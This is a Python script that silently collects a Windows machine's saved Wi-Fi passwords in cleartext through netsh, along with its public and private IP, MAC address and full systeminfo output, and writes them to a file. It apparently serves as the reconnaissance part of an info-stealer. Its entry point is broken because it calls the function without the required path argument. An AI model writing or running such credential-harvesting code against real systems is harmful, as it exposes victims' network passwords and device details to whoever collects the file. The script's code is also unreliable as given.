#modules needed
import platform
import socket
from requests import get
import uuid
import subprocess

# get the computer information
def computer_information(path):

    # now we will store the profiles data in "data" variable by 
    # running the 1st cmd command using subprocess.check_output
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')

    # now we will store the profile by converting them to list
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

    with open(path, "a") as f:
        f.write("*"*10+"\t\t"+"==> BASIC INFORMATION <=="+"\t\t"+"*"*10+"\n\n")
        f.write("_WIFI PASSWORDS_  :\n")
        # using for loop in python we are checking and printing the wifi 
        # passwords if they are available using the 2nd cmd command
        for i in profiles:
            # running the 2nd cmd command to check passwords
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i,'key=clear']).decode('utf-8').split('\n')
            # storing passwords after converting them to list
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            # printing the profiles(wifi name) with their passwords using 
            # try and except method 
            try:
                f.write("                    {:<30}|  {:<} \n".format(i, results[0]))
            except IndexError:
                f.write("                    {:<30}|  {:<} \n".format(i,""))


    with open(path, "a") as f:
        hostname = socket.gethostname()     # getting the hostname by socket.gethostname() method
        IPAddr = socket.gethostbyname(hostname)     # getting the IP address using socket.gethostbyname() method
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("\n\nPublic IP Address : " + public_ip + '\n')

        except Exception:
            f.write("\n\nCouldn't get Public IP Address (most likely max query")

        f.write("Private IP Address: " + IPAddr + "\n")
        f.write("The MAC address   : " + ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)for ele in range(0,8*6,8)][::-1])+'\n')
        f.write("Processor         : " + platform.processor() + '\n')
        f.write("System            : " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine           : " + platform.machine() + "\n")
        f.write("Hostname          : " + hostname + "\n")
        
        f.write("\n\n"+"*"*10+"\t\t"+"==> ADDITIONAL INFORMATION <=="+"\t\t"+"*"*10+"\n\n")
        # traverse the info
        Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
        new = []

        # arrange the string into clear info
        for item in Id:
            new.append(str(item.split("\r")[:-1]))
        for i in new:
            f.write(i[2:-2]+"\n")


if __name__ == "__main__":
    computer_information()
